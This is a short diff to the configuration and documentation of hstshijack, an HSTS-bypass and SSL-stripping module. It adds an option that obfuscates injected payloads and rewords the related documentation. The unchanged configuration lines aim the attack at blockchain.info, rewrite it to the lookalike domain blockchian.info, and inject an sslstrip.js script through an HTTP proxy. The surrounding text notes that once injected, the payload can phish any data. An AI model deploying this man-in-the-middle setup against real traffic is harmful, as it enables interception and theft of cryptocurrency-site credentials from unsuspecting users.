@@ -11,6 +11,7 @@ set hstshijack.ignore          *
 set hstshijack.targets         blockchain.info,*.blockchain.info
 set hstshijack.replacements    blockchian.info,*.blockchian.info
 #set hstshijack.blockscripts    domain.com,*.domain.com
+set hstshijack.obfuscate       true
 set hstshijack.custompayloads  *:hstshijack/payloads/sslstrip.js
 
 set http.proxy.script  hstshijack/hstshijack.js
@@ -44,10 +45,9 @@ Once the payload is injected into a page, you can technically phish any data unl
 
 ### Obfuscation
 
-Your custom payloads are automatically obfuscated by the module.
+Your custom payloads can be automatically obfuscated by the module.
 
-Any instance beginning with `obf_` will be obfuscated.
-
+If the `hstshijack.obfuscate` variable is set, any instance beginning with `obf_` will be obfuscated.
 
 Example: 
 
